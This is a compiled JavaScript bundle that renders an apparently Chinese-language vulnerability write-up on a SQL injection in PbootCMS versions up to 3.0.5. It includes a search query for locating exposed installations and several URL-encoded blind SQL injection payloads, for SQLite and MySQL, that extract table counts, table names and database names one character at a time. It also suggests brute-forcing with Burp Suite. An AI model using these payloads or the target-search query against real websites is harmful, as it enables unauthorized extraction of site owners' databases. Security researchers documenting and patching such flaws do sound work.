(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{1141:function(a,s,t){a.exports=t.p+"assets/img/1629446682012-1df0a2c6-c764-4f1f-a5ae-cb85fd927b7e.4be090ad.png"},1142:function(a,s,t){a.exports=t.p+"assets/img/1629446712199-bb42a36a-69b2-485a-b0e6-0512f775cf45.76649657.png"},1143:function(a,s,t){a.exports=t.p+"assets/img/1629446812952-1dc35ab3-7379-424b-aad0-f8ad0629361c.2f65fab1.png"},1144:function(a,s,t){a.exports=t.p+"assets/img/1629447097101-67648843-6711-4cbc-a2f2-dfa5f6aaa6f9.4191dae6.png"},1145:function(a,s,t){a.exports=t.p+"assets/img/1629447283665-e890ddac-0cea-4447-a0ff-d42578145f93.628c58fe.png"},1146:function(a,s,t){a.exports=t.p+"assets/img/1629447585595-c411c868-fcff-4361-8a84-84596245407a.8ef79c68.png"},1147:function(a,s,t){a.exports=t.p+"assets/img/1629447665612-0b0fe39d-b896-41d9-9904-cf760f2b516c.53c3b06d.png"},2798:function(a,s,t){"use strict";t.r(s);var e=t(64),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"pbootcms-domain-sql注入漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#pbootcms-domain-sql注入漏洞"}},[a._v("#")]),a._v(" PbootCMS domain SQL注入漏洞")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("PbootCMS <= 3.0.5")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v('app="PBOOTCMS"')]),s("br"),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("本地搭建好最新版本,访问首页")]),a._v(" "),s("p",[s("img",{attrs:{src:t(1141),alt:"img"}})]),a._v(" "),s("p",[a._v("我们需要访问一个存在的页面")]),a._v(" "),s("p",[a._v("url中13后加个单引号 '")]),a._v(" "),s("p",[s("img",{attrs:{src:t(1142),alt:"img"}})]),a._v(" "),s("p",[a._v("若为执行sql报错相关,则漏洞存在")]),a._v(" "),s("p",[a._v("若显示下图")]),a._v(" "),s("p",[s("img",{attrs:{src:t(1143),alt:"img"}})]),a._v(" "),s("p",[a._v("则漏洞无法利用")]),a._v(" "),s("p",[a._v("程序默认搭建为sqlite3数据库, Fuzz当前数据库表单payload")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v("')%0aand%0a(SELECT%0acount(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d'ta ble'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%')<40--\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:t(1144),alt:"img"}})]),a._v(" "),s("p",[a._v("通过此payload进行盲注Fuzz数据库中表单总数是否小于40")]),a._v(" "),s("p",[a._v("查询为真返回正常,假则报错")]),a._v(" "),s("p",[s("img",{attrs:{src:t(1145),alt:"img"}})]),a._v(" "),s("p",[a._v("由此我们可以准确推断出表单总数")]),a._v(" "),s("p",[a._v("计算sqlite数据库中第一个表名长度,我们可以使用如下payload:")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v("')%0aand%0a(SELECT%0alength(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d't able'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a1%0aoffset%0a0)<8--\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:t(1146),alt:"img"}})]),a._v(" "),s("p",[a._v("猜解第一个表名称,我们可以使用如下payload:")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v("')%0aand%0a(SELECT%0asubstr(tbl_name,1,1)%0aFROM%0asqlite_master%0aWHERE%0atype% 3d'table'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a1%0aoffset%0a0)%3d'a'--\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:t(1147),alt:"img"}})]),a._v(" "),s("p",[a._v('这样可以得到数据库第一个表的第一位数值为字符串"a"')]),a._v(" "),s("p",[a._v("通过substr()函数,我们可以很轻松的得到表名称.")]),a._v(" "),s("p",[a._v("同理可获取其他数据")]),a._v(" "),s("h4",{attrs:{id:"在mysql下的利用方式"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#在mysql下的利用方式"}},[a._v("#")]),a._v(" 在Mysql下的利用方式")]),a._v(" "),s("p",[a._v("猜解当前数据库名称 可以使用如下payload进行Fuzz:")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v("')%0aand%0a(select%0asubstr(database(),1,1)%3d'p')%23\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("查询为真时页面将返回正常.")]),a._v(" "),s("p",[a._v("使用Burpsuite可以爆破出数据库名称,其他表名字段名等方法相同")]),a._v(" "),s("a-alert",{attrs:{type:"success",message:"(附: https://github.com/Catw0rld/vulner/issues/1)",description:"",showIcon:""}}),a._v(" "),s("br")],1)}),[],!1,null,null,null);s.default=r.exports}}]);